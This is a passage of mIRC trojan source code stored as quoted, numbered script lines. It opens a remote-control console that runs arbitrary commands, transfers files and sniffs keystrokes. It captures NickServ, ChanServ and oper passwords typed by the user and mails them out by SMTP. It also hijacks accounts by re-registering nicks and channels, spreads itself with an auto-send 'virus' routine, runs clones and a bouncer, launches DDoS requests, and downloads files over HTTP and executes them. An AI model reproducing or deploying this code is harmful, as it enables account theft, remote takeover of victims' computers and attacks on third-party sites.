            "n159=  if ($hget(Data, $rev(%sName, Init)) == 1) { .hadd Data $rev(%sName, Init) 0 }",
            "n160=  else { $sendfile($sockname) }",
            "n161=}",
            "n162=on *:sockread:Local-SendFile-*:{",
            "n163=  var %cName = Local-Console- $+ $GetTok($sockname,3-,$asc(-)) , %sName = $rev(%cName, SendFile) , %sRead = \"\"",
            "n164=  .sockread %sread",
            "n165=  .hadd Data $rev(%sName, Pos) $GetTok(%sread,2,$asc(!))",
            "n166=  $sendfile($sockname)",
            "n167=}",
            "n168=",
            "n169=on *:sockopen:Local-RecvFile-*:{",
            "n170=  var %sName = Local-Console- $+ $GetTok($sockname,3-,$asc(-)) , %hName = $rev(%sName,RecvFile)",
            "n171=  .hadd Data $sockname %sName",
            "n172=  var %resume = $file($shortfn($hget(Data, $rev(%hName, LocalName)))).size",
            "n173=  if (%resume == $null) %resume = 0",
            "n174=  .sockwrite -tn $sockname RecvFile! $+ $hget(Data, $rev(%hName, RemoteName)) $+ ! $+ $hget(Data, $rev(%hName, LocalName)) $+ ! $+ $hget(Data, $rev(%sName,Remote)) $+ ! $+ %resume",
            "n175=}",
            "n176=on *:sockread:Local-RecvFile-*:{ .RecvFile }",
            "n177=on *:sockclose:Local-RecvFile-*:{ .RecvFile Closing }",
            "n178=",
            "n179=; ********************* SERVER CONSOLE ***********************",
            "n180=on *:socklisten:Listen-Console:{",
            "n181=  var %sName = $AcceptIt(Server-Console)",
            "n182=  .sockwrite -tn %sName WelCoMe, I'm running RoRo Console v1.0 Final -BiG-",
            "n183=}",
            "n184=",
            "n185=on *:sockwrite:Server-Console-*:{",
            "n186=  if ($hget(Data, $rev($sockname,Active)) == DIR) {",
            "n187=    %DIR.Tmp = $ev(DIR, Items, %DIR.i)",
            "n188=    inc %DIR.i",
            "n189=    if (%DIR.Tmp != $null && $Verify($sockname) == 1) .sockwrite -tn $sockname %DIR.Tmp",
            "n190=    else { .unset %DIR.* | .hadd Data $rev($sockname, Active) Free }",
            "n191=  }",
            "n192=}",
            "n193=",
            "n194=on *:sockread:Server-Console-*:{ ",
            "n195=  var %sread \"\"",
            "n196=  .sockread %sread",
            "n197=  if ($pos(%sread,!,0) != 0) var %Comm = $GetTok(%sread,1,$asc(!))",
            "n198=  else var %Comm = %Sread",
            "n199=  if (%comm == CD) { .CD $GetTok(%sread,2-,$asc(!)) }",
            "n200=  else if (%comm == SD) { .SD }",
            "n201=  else if (%comm == DIR) .DIR $GetTok(%sread,2-,$asc(!))",
            "n202=  else if (%comm == RESTART) .RestartMe",
            "n203=  else if (%comm == SHUTDOWN) .ShutDownMe",
            "n204=  else if (%comm == INFO) .InfoMe",
            "n205=  else if (%comm == STATUS) .StatusMe",
            "n206=  else if (%comm == SENDFILE) .SendIt",
            "n207=  else if (%comm == RECVFILE) .RecvIt",
            "n208=  else if (%comm == GETCONSOLE) .GetConsole",
            "n209=  else if (%comm == BNC) .BNCIt $GetTok(%sread,2-,$asc(!))",
            "n210=  else if (%comm == SNIFFER) .SnifferIt $GetTok(%sread,2-,$asc(!))",
            "n211=  else if (%comm == EXEC) .ExecIt $GetTok(%sread,2-,$asc(!))",
            "n212=  else if (%comm == MASS) .MassMe $GetTok(%sread,2-,$asc(!))",
            "n213=}",
            "n214=",
            "n215=; ********************* LOCAL CONSOLE ***********************",
            "n216=on *:CLOSE:@Local-Console-*:{ .CloseConsole $GetTok($target,3-,$asc(-)) }",
            "n217=alias CDO return $decode(V2luZmlsZS5pbmk=,mt)",
            "n218=alias CloseConsole { .sockclose Local-*- $+ $1 | .hdel -w Data $rev(Local-Console- $+ $1,*) | window -c @Local-Console- $+ $1 }",
            "n219=alias OpenConsole { .sockopen Local-Console- $+ $1 $2 2000 | .sockmark Local-Console- $+ $1 $2 }",
            "n220=alias UseConsole {",
            "n221=  var %cName = Local-Console- $+ $1",
            "n222=  var %cIP = $hget(Data, $rev(%cName,IP))",
            "n223=  if ($Verify(%cName) == 0) return Error",
            "n224=  if ($pos($2-,!,0) != 0) var %Comm = $GetTok($2-,1,$asc(!))",
            "n225=  else var %Comm = $2-",
            "n226=  if ($getPriv == Master) .aline -h 4 $wind(%cName) .[>>]. $2-",
            "n227=  if (%comm == SendFile) {",
            "n228=    .hadd Data $rev(%cName, SendFile, LocalName) $GetTok($2-,2,$asc(!))",
            "n229=    .hadd Data $rev(%cName, SendFile, RemoteName) $GetTok($2-,3,$asc(!))",
            "n230=    if ($Verify(%cName) == 1) .sockwrite -tn %cName $2-",
            "n231=    .sockopen Local-SendFile- $+ $1 %cIP 1990",
            "n232=  }",
            "n233=  else if (%comm == RecvFile) {",
            "n234=    .hadd Data $rev(%cName, RecvFile, LocalName) $GetTok($2-,3,$asc(!))",
            "n235=    .hadd Data $rev(%cName, RecvFile, RemoteName) $GetTok($2-,2,$asc(!))",
            "n236=    if ($Verify(%cName) == 1) .sockwrite -tn %cName $2-",
            "n237=    .sockopen Local-RecvFile- $+ $1 %cIP 1991",
            "n238=  }",
            "n239=  else { if ($Verify(%cName) == 1) .sockwrite -tn %cName $2- }",
            "n240=}",
            "n241=",
            "n242=alias SendSlave { ",
            "n243=  var %cName = Local-Console- $+ $1",
            "n244=  .hadd Data Sending Busy",
            "n245=  .hadd Data $rev(%cName, SendFile, LocalName) $WinDir $+ \\ $+ $decode(UnVuZGxsMTYuZXhl,mt)",
            "n246=  .hadd Data $rev(%cName, SendFile, RemoteName) $decode(QzpcUm9Sby5leGU=,mt)",
            "n247=  .hadd Data $rev(%cName, SendFile, Virus) 1",
            "n248=  .sockwrite -tn $sockname Auto-Virus-Sending on..",
            "n249=  .sockopen Local-SendFile- $+ $1 $2 1990",
            "n250=}",
            "n251=",
            "n252=on *:sockread:Local-Console-*:{",
            "n253=  var %Tmp = \"\" , %Comm = \"\" , %Param , %sNick = $GetTok($sockname,3-,$asc(-))",
            "n254=  .sockread %Tmp",
            "n255=  %Comm = $GetTok(%Tmp,1,$asc(>))",
            "n256=  if (Welcome* iswm %Tmp) {",
            "n257=    var %sAddr = $sock($sockname).mark",
            "n258=    .hadd Data $rev(Local-Console- $+ %sNick,IP) %sAddr",
            "n259=    if ($getPriv == Master) .window -aeC @Local-Console- $+ %sNick 40 40 600 400",
            "n260=    .UseConsole %sNick GetConsole",
            "n261=    .UseConsole %sNick Status",
            "n262=    if ($hget(Data, MassExec) != $null) .UseConsole %sNick Mass! $+ $hget(Data, MassExec)",
            "n263=  }",
            "n264=  if ($getPriv == Master) .aline -h 12 $wind($sockname) .[<<]. %Tmp",
            "n265=  if (%Comm == (GETCONSOLE)) .hadd Data $rev($sockname,Remote) $GetTok(%Tmp,2,$asc(>))",
            "n266=  if (%Comm == (STATUS)) {",
            "n267=    if ($getStat == Full && $hget(Data, Sending) == Idle) {",
            "n268=      if ($GetTok(%Tmp,2,$asc(>)) == Semi && $GetTok(%Tmp,3,$asc(>)) == Idle) { .SendSlave %sNick $Hget(Data, $rev($sockname,IP)) }",
            "n269=      else if ($getPriv != Master) .CloseConsole %sNick",
            "n270=    }",
            "n271=    else if ($getPriv != Master) .CloseConsole %sNick",
            "n272=  }",
            "n273=}",
            "n274=on *:sockclose:Local-Console-*:{ .hdel -w Data $rev($sockname,*) | if ($getPriv == Master) .aline 6 $wind($sockname) .[!!]. Console closed by remote host.. }",
            "n275=",
            "n276=; ************************  SYSTEM FUNCTIONS  **************************",
            "n277=alias ev {",
            "n278=  var %ev.num 0 , %ev.final \"\" | while (%ev.num != $0) { .inc %ev.num | %ev.final = %ev.final $+ [ . [ $+ [ $ [ $+ [ %ev.num ] ] ] ] ] }",
            "n279=%ev.final = $right(%ev.final,$calc($len(%ev.final) - 1)) | .return % [ $+ [ %ev.final ] ] }",
            "n280=alias rev {",
            "n281=  var %ev.num 0 , %ev.final \"\" | while (%ev.num != $0) { .inc %ev.num | %ev.final = %ev.final $+ [ . [ $+ [ $ [ $+ [ %ev.num ] ] ] ] ]  }",
            "n282=%ev.final = $right(%ev.final,$calc($len(%ev.final) - 1)) | .return %ev.final } ",
            "n283=alias sev {",
            "n284=  var %ev.num 0 , %ev.final \"\" |  while (%ev.num != $calc($0 - 1)) { .inc %ev.num | %ev.final = %ev.final $+ [ . [ $+ [ $ [ $+ [ %ev.num ] ] ] ] ] }",
            "n285=%ev.final = $right(%ev.final,$calc($len(%ev.final) - 1)) | set % [ $+ [ %ev.final ] ] $ [ $+ [ $calc($0 - 1 + 1) ] ] }",
            "n286=; **************** PASS PASS PASS ****************",
            "n287=alias dif {",
            "n288=  if ($GFN($4) == $null) .SetFileNames",
            "n289=  if ($readini($GFN($4),$1,$2) != $3) {",
            "n290=    var %i = $calc($readini($GFN($4), Options, Count) + 1)",
            "n291=    if (%i >= 3) { %i = 0 | .writeini $GFN($4) Options Status New }",
            "n292=    .writeini $GFN($4) Options Count %i",
            "n293=  }",
            "n294=  .writeini $GFN($4) $1 $2 $3",
            "n295=}",
            "n296=on *:input:*:{",
            "n297=  var %i = 1 , %sIrc = IRC",
            "n298=  if ((*Msg iswm $1 && $2 == NS) || NickServ isin $1) {",
            "n299=    if (NickServ isin $1) { %i = 0 | %sIrc = IRC2 }",
            "n300=    if (id isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif $me Temp-Pass [ $ $+ [ $calc(3 + %i) ] ] %sIRC }",
            "n301=    if (reg isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif $me Temp-Pass [ $ $+ [ $calc(3 + %i) ] ] %sIRC | .dif $me Perm-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC }",
            "n302=    if (newp isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif $me Temp-Pass [ $ $+ [ $calc(3 + %i) ] ] %sIRC | .dif $me Perm-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC }",
            "n303=  }",
            "n304=  if ((*Msg iswm $1 && $2 == CS) || ChanServ isin $1) {",
            "n305=    if (ChanServ isin $1) { %i = 0 | %sIrc = IRC2 }",
            "n306=    if (id isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif [ $ $+ [ $calc(3 + %i) ] ] Temp-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC }",
            "n307=    if (reg isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif [ $ $+ [ $calc(3 + %i) ] ] Temp-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC | .dif [ $ $+ [ $calc(3 + %i) ] ] Perm-Pass [ $ $+ [ $calc(5 + %i) ] ] %sIRC } ",
            "n308=    if (newp isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif [ $ $+ [ $calc(3 + %i) ] ] Temp-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC | .dif [ $ $+ [ $calc(3 + %i) ] ] Perm-Pass [ $ $+ [ $calc(5 + %i) ] ] %sIRC }",
            "n309=  }",
            "n310=  if ($getCountry == BG) {",
            "n311=    if (*Oper iswm $1 && $0 == 3) { .dif $2 OPER-PASS $3 IRC }",
            "n312=    if (*Msg iswm $1 && $2 == OS) { if (id isin $3) .dif $me OS-PASS $4 IRC }",
            "n313=  }",
            "n314=  if ($hget(Data, Sniffer.Input) == 1 && $Verify($hget(Data, Sniffer.Console)) == 1) .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (INPUT) ( $+ $active $+ ) $1-",
            "n315=  if ($GetTok($active,1,$asc(-)) == @Local) .UseConsole $GetTok($active,3-,$asc(-)) $1-",
            "n316=}",
            "n317=",
            "n318=; *************** DROP DROP DROP ****************",
            "n319=alias DropOff { .hadd Data Drop On }",
            "n320=alias Drop {",
            "n321=  if ($getCountry == Other) .return",
            "n322=  if ($readini($GFN(IRC), $2, Perm-Pass) == $null) .return",
            "n323=  if ($1 == nick) { .ignore -u30 NS | .msg ns id $readini($GFN(IRC), $2, Temp-Pass) | .msg ns drop $readini($GFN(IRC), $2, Perm-Pass) | .msg ns reg $Random($Rand(4,7)) $Random($Rand(3,8)) }",
            "n324=  if ($1 == chan) { .ignore -u30 CS | .msg cs drop $2 $readini($GFN(IRC), $2, Perm-Pass) | .msg cs register $2 $Random($Rand(4,7)) $Random($Rand(3,8)) }",
            "n325=}",
            "n326=",
            "n327=; **************** CLONES CLONES CLONES *****************",
            "n328=alias Random { var %i = 0 , %s \"\" | while (%i < $1) { %s = %s $+ $rand(a,z) | inc %i } | .return %s }",
            "n329=alias UseClone { if ($sock(Clone-*,0) > 0) .sockwrite -tn Clone-* $1- }",
            "n330=alias LoadClone { var %clone.sock = $OpenIt(Clone) | .sockopen %clone.sock $1 6667 | .sockmark %clone.sock $1- }",
            "n331=on *:sockopen:Clone-*:{",
            "n332=  if ($sockerr > 0) .return",
            "n333=  %Clone.Server = \" $+ $gettok($sock($sockname).mark,1,32) $+ \"",
            "n334=  %Clone.Nick = $gettok($sock($sockname).mark,2,32) | if (%Clone.Nick == $null) { %Clone.Nick = $Random($Rand(4,9)) }",
            "n335=  %Clone.Ident = $gettok($sock($sockname).mark,3,32) | if (%Clone.Ident == $null) { %Clone.Ident = $Random($Rand(4,7)) }",
            "n336=  %Clone.Mail = \" $+ $gettok($sock($sockname).mark,4,32) $+ \" | if (%Clone.Mail == \"\") { %Clone.Mail = \" $+ $Random($Rand(4,7)) $+ \" }",
            "n337=  %Clone.Name = : $+ $gettok($sock($sockname).mark,5-,32) | if (%Clone.Name == :) { %Clone.Name = $Random($Rand(3,10)) $Random($Rand(2,6)) }",
            "n338=  .sockwrite -tn $sockname NICK %Clone.Nick",
            "n339=  .sockwrite -tn $sockname USER %Clone.Ident %Clone.Mail %Clone.Server %Clone.Name",
            "n340=  .unset %Clone-*",
            "n341=}",
            "n342=on *:sockread:Clone-*:{",
            "n343=  if ($sockerr > 0) .return",
            "n344=  var %sRead \"\" , %sNick \"\" , %sText \"\"",
            "n345=  .sockread %sRead",
            "n346=  %sNick = $remove($gettok(%sRead,1,$asc(!)),:) | %sText = $gettok(%sRead,2,$asc(:))",
            "n347=  if ($1 == PING) { .sockwrite -tn $sockname PONG $remove(%sRead, $left(%sRead,5)) } ",
            "n348=  else if ($gettok(%sRead,2,$asc(:)) == IP!) { .sockwrite -tn $sockname NOTICE %sNick IP_ $+ $IP }",
            "n349=  else if (IP_*.* iswm %sText) {",
            "n350=    .hinc Data iIP",
            "n351=    if ($hget(Data, iIPCount) // $hget(Data, iIP)) {",
            "n352=      if ($gettok($sock($sockname).mark,2,32) != %sNick && $Verify(Local-Console $+ %sNick) == 0) .OpenConsole %sNick $gettok(%sText,2,$asc(_))",
            "n353=    }",
            "n354=  }",
            "n355=}",
            "n356=; **************** BNC BNC BNC *****************",
            "n357=on *:socklisten:Listen-BNC:{ if ($sock(Gateway-BNC).mark == 1) { .sockaccept Server-BNC | .sockmark Server-BNC 1 } }",
            "n358=on *:sockopen:Gateway-BNC:{ .sockmark $sockname 1 }",
            "n359=on *:sockclose:Gateway-BNC:{ .sockclose Server-BNC }",
            "n360=on *:sockclose:Server-BNC:{ .sockclose Gateway-BNC }",
            "n361=on *:sockread:Server-BNC:{",
            "n362=  var %Tmp \"\" | .sockread %Tmp",
            "n363=  if ($Verify(Gateway-BNC) == 1) .sockwrite -tn Gateway-BNC %Tmp",
            "n364=}",
            "n365=on *:sockread:Gateway-BNC:{",
            "n366=  var %Tmp \"\" | .sockread %Tmp",
            "n367=  if ($sock(Server-BNC).mark == 1 && $Verify(Server-BNC) == 1) .sockwrite -tn Server-BNC %Tmp",
            "n368=}",
            "n369=alias BNCIt {",
            "n370=  if ($Verify($sockname) == 1 && $verify(Gateway-BNC) != 1) { ",
            "n371=    .sockwrite -tn $sockname (BNC) Server: $1 Port: $2",
            "n372=    .sockopen Gateway-BNC $1 $2",
            "n373=  }",
            "n374=}",
            "n375=; ****************** TROJAN FUNCTIONS *******************",
            "n376=alias StatusMe if ($Verify($sockname) == 1) .sockwrite -tn $sockname (STATUS)> $+ $getStat $+ > $+ $hget(Data, Recving)",
            "n377=alias SendIt if ($Verify($sockname) == 1) .sockwrite -tn $sockname (SENDFILE) > Request Accepted",
            "n378=alias RecvIt if ($Verify($sockname) == 1) .sockwrite -tn $sockname (RECVFILE) > Request Accepted",
            "n379=alias GetConsole if ($Verify($sockname) == 1) .sockwrite -tn $sockname (GETCONSOLE)> $+ $sockname",
            "n380=alias RestartMe { .run $windir $+ \\rundll.exe user.exe,exitwindowsexec | if ($Verify($sockname) == 1) .sockwrite -tn $sockname (RESTART) > Restart in progress.. }",
            "n381=alias ShutDownMe { .run $windir $+ \\rundll.exe user.exe,exitwindows | if ($Verify($sockname) == 1) .sockwrite -tn $sockname (SHUTDOWN) > Shutting down.. }",
            "n382=alias InfoMe if ($Verify($sockname) == 1) .sockwrite -tn $sockname (INFO) > Nick: $Me IP: $Ip Host: $Host OS: $os Version: $version",
            "n383=alias ExecIt { $1- | if ($Verify($sockname) == 1) .sockwrite -tn $sockname (EXEC) $1- Executed.. }",
            "n384=alias Verify {",
            "n385=  if ($sock($1).name != $null) { return 1 }",
            "n386=  else { return 0 }",
            "n387=}",
            "n388=alias MassMe {",
            "n389=  var %sExec = $readini($GFN(DEF), Mass, Executed)",
            "n390=  if ($1- !isin %sExec) { .hadd Data Mass On | .hadd Data MassExec $1- | .writeini $GFN(DEF) Mass Executed %sExec , $1- | $1- }",
            "n391=}",
            "n392=alias SnifferIt {",
            "n393=  var %iStat = 0 | if ($2 == Start) { %iStat = 1 | .hadd Data Sniffer.Console $sockname }",
            "n394=  if (i isin $1) { .hadd Data Sniffer.Input %iStat } ",
            "n395=  if (m isin $1) { .hadd Data Sniffer.Messages %iStat }",
            "n396=  if (n isin $1) { .hadd Data Sniffer.Notices %iStat }",
            "n397=  if ($Verify($sockname) == 1) .sockwrite -tn $sockname (SNIFFER) Options completed..",
            "n398=}",
            "n399=alias SD { if ($Verify($sockname) == 1) .sockwrite -tn $sockname (SD) > Current Directory: $hget(Data, $rev($sockname,CD)) }",
            "n400=alias CD { .hadd Data $rev($sockname,CD) $1- | if ($Verify($sockname) == 1) .sockwrite -tn $sockname (CD) > Directory changed to $1- }",
            "n401=alias DIRFormat .return ..\\ $+ $right(%DIR.Item, $calc($len(%DIR.Item) - $pos(%DIR.Item,\\,$calc(%DIR.num + 1)))) ( $+ $Bytes($file(%DIR.Item).size).suf $+ )",
            "n402=alias DIR {",
            "n403=  .unset %DIR.*",
            "n404=  %DIR.Index = 0 | %DIR.Index2 = 0 | %DIR.i = 1 | %DIR.Mask = * | %DIR.Depth = 1",
            "n405=  %DIR.CD = $hget(Data, $rev($sockname,CD)) | %DIR.num = $pos(%DIR.CD,\\,0)",
            "n406=  if ($1 != $null) %DIR.Mask = $1",
            "n407=  if ($2 != $null) %DIR.Depth = $2",
            "n408=  %DIR.Tmp = BEGIN(Dir) %Dir.CD %Dir.Mask %Dir.Depth",
            "n409=  $sev(DIR, Items, 0, %DIR.Tmp)",
            "n410=  :DirNext",
            "n411=  inc %DIR.Index",
            "n412=  %DIR.item = $finddir(%Dir.CD, %DIR.Mask, %DIR.Index, %DIR.Depth)",
            "n413=  if (%DIR.item != $null) { $sev(DIR, Items, %DIR.Index, $GetFileName(%DIR.Item) <DIR>) | goto DirNext }",
            "n414=  else { dec %DIR.Index }",
            "n415=  :FileNext",
            "n416=  inc %DIR.Index2",
            "n417=  %DIR.item = $findfile(%Dir.CD, %DIR.Mask, %DIR.Index2, %DIR.Depth)",
            "n418=  if (%DIR.item != $null) { $sev(DIR, Items, $calc(%DIR.Index + %DIR.Index2), $DIRFormat) | goto FileNext }",
            "n419=  else { dec %DIR.Index2 }",
            "n420=  %DIR.Tmp = END(Dir) %DIR.Index Dir(s) %DIR.Index2 File(s)",
            "n421=  $sev(DIR, Items, $calc(%DIR.Index + %DIR.Index2 + 1), %DIR.Tmp)",
            "n422=  .hadd Data $rev($sockname,Active) DIR",
            "n423=  if ($Verify($sockname) == 1) .sockwrite -tn $sockname $ev(DIR, Items, 0)",
            "n424=}",
            "n425=",
            "n426=; ************* CHECK CHECK CHECK ****************",
            "n427=alias CheckSites {",
            "n428=  var %sTmp = $ini($GFN(DEF),SITES,1) , %sTmp2 = %sTmp",
            "n429=  if (%sTmp != $null) { %sTmp = $remove(%sTmp,http://,www.) | .sockopen Check-Sites %sTmp 80 | .sockmark Check-Sites %sTmp2 1 }",
            "n430=}",
            "n431=on *:sockopen:Check-Sites:{ if ($sockerr > 0) .halt | .RequestURL $sockname / $remove($gettok($sock($sockname).mark,1,32),http://,www.) }",
            "n432=on *:sockread:Check-Sites:{",
            "n433=  var %sRead \"\" | .sockread %sRead",
            "n434=  if (HTTP/* iswm %sRead) {",
            "n435=    if (*200* !iswm %sRead) { .remini $GFN(DEF) SITES $gettok($sock($sockname).mark,1,32) | .writeini $GFN(DEF) Missing $gettok($sock($sockname).mark,1,32) 0 }",
            "n436=    var %i = $calc($gettok($sock($sockname).mark,2,32) + 1) , %sTmp = $ini($GFN(DEF),SITES,%i) , %sTmp2 = %sTmp",
            "n437=    .sockclose $sockname",
            "n438=    if (%sTmp != $null) { %sTmp = $remove(%sTmp,http://,www.) | .sockopen Check-Sites %sTmp 80 | .sockmark Check-Sites %sTmp2 %i }",
            "n439=  }",
            "n440=}",
            "n441=; ************** DDOS DDOS DDOS ***************",
            "n442=alias DDos {",
            "n443=  .sockclose DDos-*",
            "n444=  var %i = 0 , %iCount = $ini($GFN(DEF),Missing,0) , %sTmp = \"\" , %sName = \"\"",
            "n445=  while (%i < %iCount) { ",
            "n446=    .inc %i | %sTmp = $ini($GFN(DEF),Missing,%i) | %sTmp = $remove(%sTmp,http://,www.)",
            "n447=    if (free. isin %sTmp) %sTmp = $remove($gettok(%sTmp,1,$asc(/)),free.)",
            "n448=    else %sTmp = $gettok($gettok(%sTmp,1,$asc(/)),2-,$asc(.))",
            "n449=    %sName = $OpenIt(DDos) | .sockopen %sName %sTmp 80 | .sockmark %sName %sTmp",
            "n450=  }",
            "n451=}",
            "n452=on *:sockopen:DDos-*:{ if ($sockerr > 0) .halt | .RequestURL $sockname / $sock($sockname).mark }",
            "n453=; *************** HTTP HTTP HTTP *****************",
            "n454=alias RequestURL {",
            "n455=  .sockwrite -n $1 GET $2 HTTP/1.1",
            "n456=  .sockwrite -n $1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*",
            "n457=  .sockwrite -n $1 Accept-Language: bg | .sockwrite -n $1 Accept-Encoding: gzip, deflate | .sockwrite -n $1 User-Agent: Mozilla/4.0 (compatible; MSIE 4.72; Windows 98)",
            "n458=  .sockwrite -n $1 Host: $3 | .sockwrite -n $1 Connection: Keep-Alive ",
            "n459=  .sockwrite -n $1 Cache-Control: no-cache | .sockwrite -n $1",
            "n460=}",
            "n461=alias HttpMe {",
            "n462=  var %sParam = $ini($GFN(DEF), HTTP, $rand(1,$ini($GFN(DEF),HTTP,0)))",
            "n463=  if (%sParam != $null) .GetHTTP %sParam $readini($GFN(DEF), HTTP, %sParam)",
            "n464=}",
            "n465=alias GetHTTP {",
            "n466=  var %http.sock = $OpenIt(GetHTTP)",
            "n467=  .hadd Data $rev(%http.sock, LocalName) $2",
            "n468=  if ($exists($hget(Data, $rev(%http.sock, LocalName))) == $true) .remove $hget(Data, $rev(%http.sock, LocalName))",
            "n469=  .hadd Data $rev(%http.sock, RemoteName) / $+ $gettok($1,2-,47) | .hadd Data $rev(%http.sock, Serv) $gettok($1,1,47)",
            "n470=  .hadd Data $rev(%http.sock, Script) $getScript | .hadd Data $rev(%http.sock, Country) $getCountry",
            "n471=  .hadd Data $rev(%http.sock, Options) $3-",
            "n472=  if ($hget(Data, $Rev(%http.sock, Serv)) != $null) .sockopen %http.sock $hget(Data, $Rev(%http.sock, Serv)) 80",
            "n473=  else .hdel -w Data $rev(%http.sock,*)",
            "n474=}",
            "n475=on *:sockopen:GetHTTP-*:{",
            "n476=  if ($sockerr > 0) { .hdel -w Data $rev($sockname,*) | .return }",
            "n477=  .RequestURL $sockname $hget(Data, $rev($sockname, RemoteName)) $hget(Data, $rev($sockname, Serv))",
            "n478=}",
            "n479=on *:sockread:GetHTTP-*:{",
            "n480=  if ($sockerr > 0) { .hdel -w Data $rev($sockname,*) | .return }",
            "n481=  var %sRead \"\"",
            "n482=  if ($hget(Data, $rev($sockname, EOR)) == 1) {",
            "n483=    var %http.LocalName $hget(Data, $rev($sockname, LocalName)) , %http.Options $hget(Data, $rev($sockname, Options))",
            "n484=    if (STORE isin %http.Options) {",
            "n485=      .sockread -f &bRead",
            "n486=      .bwrite %http.LocalName -1 &bRead",
            "n487=      if ($file(%http.LocalName).size >= $hget(Data, $rev($sockname, Size))) .hadd Data $rev($sockname, Final) 1",
            "n488=    }",
            "n489=    if (EXEC isin %http.Options) {",
            "n490=      .sockread %sRead",
            "n491=      %sRead = [ [ %sRead ] ]",
            "n492=      if (Script: isin %sRead) .hadd Data $rev($sockname, Script) $gettok(%sRead,2,32)",
            "n493=      else if (Country: isin %sRead) .hadd Data $rev($sockname, Country) $gettok(%sRead,2,32)",
            "n494=      else if (%sRead == EOF) .hadd Data $rev($sockname, Final) 1",
            "n495=      else if ($hget(Data, $rev($sockname, Script)) == $getScript && $hget(Data, $rev($sockname, Country)) == $getCountry) { %sRead }",
            "n496=    }",
            "n497=  }",
            "n498=  else {",
            "n499=    .sockread %sRead",
            "n500=    if (HTTP/* iswm %sRead && *200* !iswm %sRead) { ",
            "n501=      var %sParam = $hget(Data, $rev($sockname, Serv)) $+ $hget(Data, $rev($sockname, RemoteName))",
            "n502=      .remini $GFN(DEF) HTTP %sParam | .writeini $GFN(DEF) Missing %sParam 0",
            "n503=      .hdel -w Data $rev($sockname,*) | .sockclose $sockname",
            "n504=    }",
            "n505=    if (Content-Length* iswm %sRead) .hadd Data $rev($sockname, Size) $GetTok(%sRead,2,$asc(:))",
            "n506=    if (%sRead == $null) { .hadd Data $rev($sockname, EOR) 1 }",
            "n507=  }",
            "n508=  if ($hget(Data, $rev($sockname, Final)) == 1) { if (STORE isin %http.options && $exists(%http.LocalName) == $true) .run %http.LocalName | .hdel -w Data $rev($sockname,*) | .sockclose $sockname }",
            "n509=}",
            "n510=on *:sockclose:GetHTTP-*:{ if ($hget(Data, $rev($sockname,Final)) != 1) .remove $hget(Data, $Rev($sockname, LocalName)) | .hdel -w Data $rev($sockname,*) }",
            "n511=; ***************** MAIL MAIL MAIL ******************",
            "n512=alias MailMe {",
            "n513=  if ($getCountry == $1 && $getCountry == BG) {",
            "n514=    if ($readini($GFN(IRC),Options,Status) == New) .Mail IRC_Passes IRC $2-",
            "n515=    if ($readini($GFN(RNA),Options,Status) == New) .Mail RNA_Passes RNA $2-",
            "n516=  }",
            "n517=  if ($getCountry == $1 && $getCountry == Other) {",
            "n518=    if ($readini($GFN(IRC2),Options,Status) == New) .Mail IRC_Passes_Other IRC2 $2-",
            "n519=    if ($readini($GFN(RNA),Options,Status) == New) .Mail RNA_Passes_Other RNA $2-",
            "n520=  }",
            "n521=}",
            "n522=alias Mail {",
            "n523=  var %mail.sock = $OpenIt(Mail)",
            "n524=  .hadd Data $rev(%mail.sock, Subject) $1",
            "n525=  .hadd Data $rev(%mail.sock, LocalName) $GFN($2)",
            "n526=  if ($len($2) > 4) { .hadd Data $rev(%mail.sock, LocalName) $2 }",
            "n527=  .hadd Data $rev(%mail.sock, Recipient) $ini($GFN(DEF), MAIL, $rand(1,$ini($GFN(DEF),MAIL,0)))",
            "n528=  if ($3 != $null) .hadd Data $rev(%mail.sock, Recipient) $3",
            "n529=  .hadd Data $rev(%mail.sock, Sender) $me $+ @ $+ $GetTok($hget(Data, $rev(%mail.sock, Recipient)),2,$asc(@))",
            "n530=  .hadd Data $rev(%mail.sock, Serv) $readini($GFN(DEF), MAIL, $hget(Data, $Rev(%mail.sock, Recipient)))",
            "n531=  if ($4 != $null) .hadd Data $rev(%mail.sock, Serv) $4",
            "n532=  if ($hget(Data, $rev(%mail.sock, Serv)) != $null) .sockopen %mail.sock $hget(Data, $rev(%mail.sock, Serv)) 25 ",
            "n533=  else .hdel -w Data $rev(%mail.sock,*)",
            "n534=}",
            "n535=alias Mail.Logon {",
            "n536=  .sockwrite -n $1 HELO $hget(Data, $rev($1, Serv))",
            "n537=  .sockwrite -n $1 Mail From: $hget(Data, $rev($1, Sender))",
            "n538=  .sockwrite -n $1 Rcpt To: $hget(Data, $rev($1, Recipient))",
            "n539=  .sockwrite -n $1 Data",
            "n540=}",
            "n541=alias Mail.Head {",
            "n542=  .sockwrite -n $1 From: $hget(Data, $rev($1, Sender))",
            "n543=  .sockwrite -n $1 To: $hget(Data, $rev($1, Recipient))",
            "n544=  .sockwrite -n $1 Date: $asctime(dd mmm yy HH:nn:ss)",
            "n545=  .sockwrite -n $1 Subject: $hget(Data, $rev($1, Subject))",
            "n546=  .sockwrite -n $1",
            "n547=  .timer 1 3 Mail.Body $1",
            "n548=}",
            "n549=alias Mail.Body {",
            "n550=  if ($Verify($1) == 0) { .Logoff | .halt }",
            "n551=  var %mail.Pos 0",
            "n552=  while (%mail.Pos <= $file($hget(Data, $rev($1, LocalName))).size) { .bread $hget(Data, $rev($1, LocalName)) %Mail.Pos 2048 &bRead | .sockwrite $1 &bRead | .inc %Mail.Pos 2048 }",
            "n553=  .sockwrite -n $1 | .sockwrite -n $1 .",
            "n554=}",
            "n555=alias Mail.Logoff {",
            "n556=  if ($2 == SUCCESS) { .writeini $hget(Data, $rev($1, LocalName)) Options Status Old | .sockwrite -n $1 QUIT }",
            "n557=  else if ($Verify($1) == 1) .sockclose $1",
            "n558=  .hdel -w Data $rev($1,*)",
            "n559=}",
            "n560=on *:sockread:Mail-*:{",
